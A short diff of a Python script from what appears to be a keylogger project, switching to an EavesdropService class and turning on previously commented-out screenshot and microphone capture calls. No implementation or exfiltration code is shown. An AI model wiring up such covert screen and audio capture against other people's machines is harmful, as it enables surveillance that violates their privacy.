@@ -1,4 +1,4 @@
-from keylogger.eavesdrop import copy_clipboard, microphone, screenshot
+from keylogger.eavesdrop import EavesdropService
 
 
 def print_hello_world(name):
@@ -11,6 +11,7 @@ if __name__ == '__main__':
     # SystemInfoProvider().fetch_and_save_computer_information(file_path)
 
     # copy_clipboard()
-    # screenshot()
-    # microphone()
+    eavesdrop = EavesdropService()
+    eavesdrop.screenshot()
+    eavesdrop.microphone()
     pass
